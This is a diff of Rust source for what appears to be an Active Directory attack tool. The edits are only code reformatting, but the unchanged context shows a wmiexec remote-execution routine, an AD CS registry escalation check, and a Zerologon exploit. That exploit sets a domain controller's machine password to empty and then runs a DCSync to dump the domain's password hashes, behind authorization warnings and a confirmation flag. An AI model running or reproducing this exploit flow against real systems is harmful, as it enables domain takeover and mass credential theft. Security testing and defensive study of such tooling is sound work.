@@ -1046,7 +1046,15 @@ async fn wmiexec_cmd(a: ExecArgs) -> Result<()> {
 
     // The process is detached — poll-read the output file over C$ until it lands.
     let mut smb = SmbClient::connect(&a.host).await?;
-    smb_login(&mut smb, &a.host, &a.domain, &a.user, &a.password, &a.nt_hash).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
     smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
     let mut out = None;
     for _ in 0..24 {
@@ -2195,7 +2203,8 @@ async fn esc_registry_scan(a: EscArgs) -> Result<()> {
     let mut smb = SmbClient::connect(&a.host).await?;
     smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host).await?;
+    let mut reg =
+        RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host).await?;
     sp.done("Remote Registry reachable");
 
     ui::header(&format!("AD CS registry ESC checks — CA {}", a.ca));
@@ -2296,7 +2305,10 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
 
     // Full restore path: set the machine account back to a known CLEARTEXT (heals NT + AES).
     if let Some(pw) = &a.restore_password {
-        let sp = ui::Spinner::start(format!("{} — full restore of {}$ (cleartext)", a.host, a.netbios));
+        let sp = ui::Spinner::start(format!(
+            "{} — full restore of {}$ (cleartext)",
+            a.host, a.netbios
+        ));
         let ok = restore_password_cleartext(&a.host, &a.netbios, pw, a.attempts).await?;
         if ok {
             sp.done("restore accepted");
@@ -2314,7 +2326,10 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
     // Restore path: set the machine account back to a known NT hash over the zero channel.
     if let Some(hex) = &a.restore {
         let nt = parse_nt_hash(hex)?;
-        let sp = ui::Spinner::start(format!("{} — restoring {}$ machine hash via Netlogon", a.host, a.netbios));
+        let sp = ui::Spinner::start(format!(
+            "{} — restoring {}$ machine hash via Netlogon",
+            a.host, a.netbios
+        ));
         let ok = restore_password(&a.host, &a.netbios, &nt, a.attempts).await?;
         if ok {
             sp.done("restore accepted");
@@ -2344,7 +2359,10 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
                 "an unauthenticated attacker can set the DC machine account password to empty → \
                  DCSync the domain → Domain Admin.",
             );
-            ui::field("remediation", "apply the August 2020 patch + enforce KB4557222.");
+            ui::field(
+                "remediation",
+                "apply the August 2020 patch + enforce KB4557222.",
+            );
             true
         }
         Zerologon::NotVulnerable { attempts } => {
@@ -2367,9 +2385,13 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
     ui::bad("EXPLOIT resets the DC machine account password to EMPTY. This is DESTRUCTIVE.");
     ui::warn("It orphans the DC's secure channel and can PERMANENTLY BREAK a single-DC domain —");
     ui::warn("restore requires the ORIGINAL machine secret and is NOT guaranteed on a lone DC.");
-    ui::warn("Only run against an authorized, RECOVERABLE target (multi-DC domain, or disposable).");
+    ui::warn(
+        "Only run against an authorized, RECOVERABLE target (multi-DC domain, or disposable).",
+    );
     if !a.confirm_brick_risk {
-        ui::info("refusing to exploit: re-run with --confirm-brick-risk once you accept the above.");
+        ui::info(
+            "refusing to exploit: re-run with --confirm-brick-risk once you accept the above.",
+        );
         return Ok(());
     }
     if !a.yes {
@@ -2388,12 +2410,17 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
     let ok = exploit_set_empty_password(&a.host, &a.netbios, a.attempts).await?;
     if !ok {
         sp.done("reset not accepted");
-        ui::warn("NetrServerPasswordSet2 was rejected — the DC may be patched between probe and reset.");
+        ui::warn(
+            "NetrServerPasswordSet2 was rejected — the DC may be patched between probe and reset.",
+        );
         return Ok(());
     }
     sp.done("machine password reset to EMPTY");
     let empty_hash = "31d6cfe0d16ae931b73c59d7e0c089c0";
-    ui::field("account", &format!("{}$  NT hash now = {empty_hash} (empty)", a.netbios));
+    ui::field(
+        "account",
+        &format!("{}$  NT hash now = {empty_hash} (empty)", a.netbios),
+    );
 
     // Prove Domain Admin: DCSync the whole domain authenticating as the DC machine account.
     let domain = if a.domain.is_empty() {
@@ -2423,7 +2450,10 @@ async fn zerologon(a: ZerologonArgs) -> Result<()> {
         .map_err(|e| anyhow::anyhow!("spawn dcsync: {e}"))?;
     let dump = String::from_utf8_lossy(&out.stdout);
     let mut dumped = false;
-    for line in dump.lines().filter(|l| l.contains(":::") || l.contains("aes256")) {
+    for line in dump
+        .lines()
+        .filter(|l| l.contains(":::") || l.contains("aes256"))
+    {
         println!("    {line}");
         dumped = true;
     }
